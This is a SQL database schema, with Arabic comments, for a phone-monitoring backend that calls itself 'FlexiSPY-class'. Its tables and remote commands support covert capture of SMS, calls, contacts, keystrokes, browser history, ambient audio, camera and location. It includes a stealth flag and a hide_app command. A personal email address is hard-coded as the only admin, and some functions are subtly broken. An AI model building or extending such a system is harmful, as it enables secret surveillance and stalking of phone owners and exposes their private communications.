-- ============================================================
-- MDM & ASSET TRACKING — FULL ENTERPRISE SCHEMA (FlexiSPY-class)
-- ============================================================

-- 1. DEVICES
CREATE TABLE devices (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_serial TEXT UNIQUE NOT NULL,
  device_token TEXT UNIQUE,             -- token سري لكل جهاز
  device_name TEXT,
  manufacturer TEXT,
  model TEXT,
  os_version TEXT,
  phone_number TEXT,
  imei TEXT,
  wifi_mac TEXT,
  bluetooth_mac TEXT,
  is_active BOOLEAN DEFAULT true,
  is_stealth BOOLEAN DEFAULT false,
  is_admin_locked BOOLEAN DEFAULT false,
  enrolled_at TIMESTAMPTZ DEFAULT now(),
  last_seen_at TIMESTAMPTZ,
  last_ip_address INET
);

-- 2. REMOTE COMMANDS (الأوامر عن بعد)
CREATE TABLE remote_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  command TEXT NOT NULL CHECK (command IN (
    'sync_now', 'capture_location', 'capture_call_logs',
    'capture_sms', 'capture_contacts', 'capture_apps',
    'capture_screenshot', 'capture_camera', 'record_ambient',
    'record_call', 'lock_device', 'wipe_device',
    'hide_app', 'unhide_app', 'enable_admin', 'disable_admin',
    'play_sound', 'send_alert', 'update_interval',
    'restart_service', 'uninstall'
  )),
  parameters JSONB,
  status TEXT DEFAULT 'pending' CHECK (status IN ('pending','delivered','executed','failed')),
  result TEXT,
  sent_at TIMESTAMPTZ DEFAULT now(),
  delivered_at TIMESTAMPTZ,
  executed_at TIMESTAMPTZ,
  expires_at TIMESTAMPTZ
);

CREATE INDEX idx_cmd_device ON remote_commands(device_serial, status);

-- 3. LOCATION HISTORY
CREATE TABLE location_history (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  latitude DOUBLE PRECISION NOT NULL,
  longitude DOUBLE PRECISION NOT NULL,
  altitude DOUBLE PRECISION,
  accuracy REAL,
  speed REAL,
  bearing REAL,
  provider TEXT, -- gps, network, fused
  captured_at TIMESTAMPTZ NOT NULL,
  received_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_location_device_time ON location_history(device_serial, captured_at DESC);

-- 4. DEVICE STATE
CREATE TABLE device_state_snapshots (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  battery_level REAL CHECK (battery_level BETWEEN 0 AND 100),
  battery_status TEXT,
  network_type TEXT,
  signal_strength INTEGER,
  storage_total BIGINT, storage_available BIGINT,
  ram_total BIGINT, ram_available BIGINT,
  is_charging BOOLEAN,
  is_roaming BOOLEAN,
  is_screen_on BOOLEAN,
  is_locked BOOLEAN,
  current_ssid TEXT,
  current_cell_id TEXT,
  captured_at TIMESTAMPTZ NOT NULL,
  received_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_state_device_time ON device_state_snapshots(device_serial, captured_at DESC);

-- 5. INSTALLED APPLICATIONS
CREATE TABLE installed_applications (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  package_name TEXT NOT NULL,
  app_name TEXT,
  version_name TEXT, version_code BIGINT,
  is_system_app BOOLEAN DEFAULT false,
  first_detected_at TIMESTAMPTZ DEFAULT now(),
  last_seen_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE (device_serial, package_name)
);

-- 6. APPLICATION CHANGE LOG
CREATE TABLE application_change_log (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  package_name TEXT NOT NULL,
  app_name TEXT,
  change_type TEXT CHECK (change_type IN ('installed','uninstalled','updated')),
  version_before TEXT, version_after TEXT,
  detected_at TIMESTAMPTZ DEFAULT now()
);

-- 7. DEVICE AUTH LOG (سجل المصادقة لكل جهاز)
CREATE TABLE device_auth_log (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  token_used TEXT,
  ip_address INET,
  action TEXT CHECK (action IN ('auth_success','auth_failed','token_rotated')),
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 8. ENCRYPTION KEYS
CREATE TABLE device_encryption_keys (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_serial TEXT UNIQUE NOT NULL REFERENCES devices(device_serial),
  public_key TEXT NOT NULL,
  key_algorithm TEXT DEFAULT 'AES-256-GCM',
  rotated_at TIMESTAMPTZ DEFAULT now(),
  is_active BOOLEAN DEFAULT true
);

-- 8. CALL LOGS (سجلات المكالمات)
CREATE TABLE call_logs (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  phone_number TEXT,
  contact_name TEXT,
  call_type TEXT CHECK (call_type IN ('incoming','outgoing','missed','rejected','blocked','voicemail')),
  duration_seconds INTEGER,
  call_date TIMESTAMPTZ,
  sim_serial TEXT,
  geocoded_location TEXT,
  captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_calls_device ON call_logs(device_serial, call_date DESC);

-- 9. SMS / MMS MESSAGES (الرسائل النصية)
CREATE TABLE sms_messages (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  phone_number TEXT,
  contact_name TEXT,
  message_body TEXT,
  message_type TEXT CHECK (message_type IN ('inbox','sent','draft','outbox','failed')),
  is_read BOOLEAN,
  thread_id TEXT,
  sms_date TIMESTAMPTZ,
  sim_serial TEXT,
  captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_sms_device ON sms_messages(device_serial, sms_date DESC);

-- 10. CONTACTS (جهات الاتصال)
CREATE TABLE contacts (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  contact_id TEXT,
  display_name TEXT,
  phone_numbers JSONB,
  emails JSONB,
  organization TEXT,
  job_title TEXT,
  notes TEXT,
  photo_url TEXT,
  last_contacted_at TIMESTAMPTZ,
  captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_contacts_device ON contacts(device_serial);

-- 11. NOTIFICATION LOGS (محتويات الإشعارات من جميع التطبيقات)
CREATE TABLE notification_logs (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  package_name TEXT,
  app_name TEXT,
  title TEXT,
  body TEXT,
  notification_category TEXT,
  posted_at TIMESTAMPTZ,
  captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_notifs_device ON notification_logs(device_serial, posted_at DESC);

-- 12. APP USAGE STATS (إحصائيات استخدام التطبيقات)
CREATE TABLE app_usage_stats (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  package_name TEXT NOT NULL,
  app_name TEXT,
  foreground_time_seconds BIGINT,
  screen_time_seconds BIGINT,
  last_used_at TIMESTAMPTZ,
  usage_date DATE NOT NULL,
  captured_at TIMESTAMPTZ DEFAULT now(),
  UNIQUE (device_serial, package_name, usage_date)
);

-- 13. BROWSER HISTORY (سجل التصفح)
CREATE TABLE browser_history (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  browser_package TEXT,
  title TEXT,
  url TEXT,
  visit_count INTEGER,
  last_visit_at TIMESTAMPTZ,
  captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE INDEX idx_browser_device ON browser_history(device_serial, last_visit_at DESC);

-- 14. MEDIA CAPTURES (صور، فيديو، صوت — meta references)
CREATE TABLE media_captures (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  media_type TEXT CHECK (media_type IN ('photo','video','audio','screenshot','ambient_recording','call_recording')),
  file_url TEXT,
  file_size_bytes BIGINT,
  mime_type TEXT,
  duration_seconds INTEGER,
  storage_url TEXT, -- Supabase Storage URL
  captured_at TIMESTAMPTZ DEFAULT now(),
  uploaded_at TIMESTAMPTZ
);

-- 15. GEOFENCE ZONES (مناطق المراقبة الجغرافية)
CREATE TABLE geofence_zones (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  name TEXT NOT NULL,
  latitude DOUBLE PRECISION NOT NULL,
  longitude DOUBLE PRECISION NOT NULL,
  radius_meters REAL NOT NULL DEFAULT 100,
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 16. GEOFENCE EVENTS (أحداث الدخول/الخروج)
CREATE TABLE geofence_events (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  zone_id UUID REFERENCES geofence_zones(id),
  zone_name TEXT,
  event_type TEXT CHECK (event_type IN ('enter','exit','dwell')),
  latitude DOUBLE PRECISION, longitude DOUBLE PRECISION,
  occurred_at TIMESTAMPTZ DEFAULT now()
);

-- 17. KEYSTROKE LOGS (تسجيل لوحة المفاتيح — مؤسسي فقط)
CREATE TABLE keystroke_logs (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  package_name TEXT,
  app_name TEXT,
  text_snapshot TEXT,
  text_hash TEXT,
  window_title TEXT,
  captured_at TIMESTAMPTZ DEFAULT now()
);

-- 18. FILE SYSTEM SNAPSHOTS (لقطة نظام الملفات)
CREATE TABLE file_system_snapshots (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  device_serial TEXT NOT NULL REFERENCES devices(device_serial),
  file_path TEXT,
  file_name TEXT,
  file_size_bytes BIGINT,
  mime_type TEXT,
  is_directory BOOLEAN,
  last_modified_at TIMESTAMPTZ,
  captured_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- Row Level Security
-- ============================================================
DO $$ DECLARE
  tbl TEXT;
BEGIN
  FOR tbl IN
    SELECT unnest(ARRAY[
      'devices','remote_commands','location_history','device_state_snapshots',
      'installed_applications','application_change_log','device_encryption_keys',
      'call_logs','sms_messages','contacts','notification_logs','app_usage_stats',
      'browser_history','media_captures','geofence_zones','geofence_events',
      'keystroke_logs','file_system_snapshots','device_auth_log'
    ])
  LOOP
    EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY;', tbl);
    EXECUTE format(
      'CREATE POLICY %I_self_access ON %I FOR ALL USING (device_serial = current_setting(''app.device_serial'')::TEXT);',
      tbl, tbl
    );
  END LOOP;
END $$;

-- جدول المسؤولين (عناوين البريد المسموح لها بدخول dashboard)
CREATE TABLE IF NOT EXISTS admin_users (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  email TEXT UNIQUE NOT NULL,
  role TEXT DEFAULT 'admin' CHECK (role IN ('admin','superadmin')),
  created_at TIMESTAMPTZ DEFAULT now()
);

-- إضافة المسؤول الوحيد (أنت فقط)
INSERT INTO admin_users (email) VALUES ('muhammad.othman.2005@gmail.com') ON CONFLICT DO NOTHING;

-- Admin bypass policy: إذا كان المستخدم admin، يرى كل الأجهزة وكل البيانات
DO $$
DECLARE
  tbl TEXT;
  tables TEXT[] := ARRAY[
    'devices','location_history','device_state_snapshots',
    'installed_applications','application_change_log','device_encryption_keys',
    'call_logs','sms_messages','contacts','notification_logs','app_usage_stats',
    'browser_history','media_captures','geofence_zones','geofence_events',
    'keystroke_logs','file_system_snapshots','device_auth_log','admin_users'
  ];
BEGIN
  FOREACH tbl IN ARRAY tables
  LOOP
    EXECUTE format(
      'CREATE POLICY %I_admin_access ON %I FOR ALL USING (
        auth.email() IN (SELECT email FROM admin_users)
      );', tbl, tbl);
  END LOOP;
END $$;

-- ============================================================
-- Functions & Triggers
-- ============================================================
CREATE OR REPLACE FUNCTION update_device_last_seen()
RETURNS TRIGGER AS $$
BEGIN
  UPDATE devices SET last_seen_at = now()
  WHERE device_serial = NEW.device_serial;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION auto_register_device()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO devices (device_serial)
  VALUES (NEW.device_serial)
  ON CONFLICT (device_serial) DO NOTHING;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Triggers
CREATE TRIGGER trg_location_update_seen AFTER INSERT ON location_history
  FOR EACH ROW EXECUTE FUNCTION update_device_last_seen();
CREATE TRIGGER trg_state_update_seen AFTER INSERT ON device_state_snapshots
  FOR EACH ROW EXECUTE FUNCTION update_device_last_seen();
CREATE TRIGGER trg_call_update_seen AFTER INSERT ON call_logs
  FOR EACH ROW EXECUTE FUNCTION update_device_last_seen();
CREATE TRIGGER trg_sms_update_seen AFTER INSERT ON sms_messages
  FOR EACH ROW EXECUTE FUNCTION update_device_last_seen();

-- ============================================================
-- Edge Functions API (للأوامر عن بعد)
-- ============================================================

-- إنشاء أمر جديد (من لوحة التحكم)
CREATE OR REPLACE FUNCTION send_command(p_device_serial TEXT, p_command TEXT, p_parameters JSONB DEFAULT '{}')
RETURNS UUID AS $$
DECLARE
  cmd_id UUID;
BEGIN
  INSERT INTO remote_commands (device_serial, command, parameters)
  VALUES (p_device_serial, p_command, p_parameters)
  RETURNING id INTO cmd_id;
  RETURN cmd_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- سحب الأوامر المعلقة (من الجهاز)
CREATE OR REPLACE FUNCTION fetch_pending_commands(p_device_serial TEXT)
RETURNS TABLE (id UUID, command TEXT, parameters JSONB, sent_at TIMESTAMPTZ) AS $$
BEGIN
  UPDATE remote_commands
  SET status = 'delivered', delivered_at = now()
  WHERE device_serial = p_device_serial AND status = 'pending'
  RETURNING id, command, parameters, sent_at;

  -- لو لم يكن هناك pending، نرجع أيام مقيدة
  IF NOT FOUND THEN
    RETURN;
  END IF;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- تحديث نتيجة أمر
CREATE OR REPLACE FUNCTION complete_command(p_cmd_id UUID, p_status TEXT, p_result TEXT DEFAULT NULL)
RETURNS VOID AS $$
BEGIN
  UPDATE remote_commands
  SET status = p_status,
      result = p_result,
      executed_at = CASE WHEN p_status IN ('executed','failed') THEN now() ELSE NULL END
  WHERE id = p_cmd_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- ============================================================
-- Device Token Functions (للمصادقة عبر Edge Function)
-- ============================================================

CREATE OR REPLACE FUNCTION generate_device_token(p_device_serial TEXT)
RETURNS TEXT AS $$
DECLARE
  new_token TEXT;
BEGIN
  new_token := encode(gen_random_bytes(48), 'base64');
  new_token := regexp_replace(new_token, '[^a-zA-Z0-9]', '', 'g');
  new_token := substring(new_token, 1, 64);

  UPDATE devices SET device_token = new_token
  WHERE device_serial = p_device_serial;

  INSERT INTO device_auth_log (device_serial, token_used, action)
  VALUES (p_device_serial, new_token, 'token_rotated');

  RETURN new_token;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE OR REPLACE FUNCTION validate_device_token(p_token TEXT)
RETURNS TABLE (device_serial TEXT, is_valid BOOLEAN) AS $$
BEGIN
  RETURN QUERY
  SELECT d.device_serial, true
  FROM devices d
  WHERE d.device_token = p_token AND d.is_active = true;

  IF NOT FOUND THEN
    RETURN QUERY SELECT NULL::TEXT, false;
  END IF;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
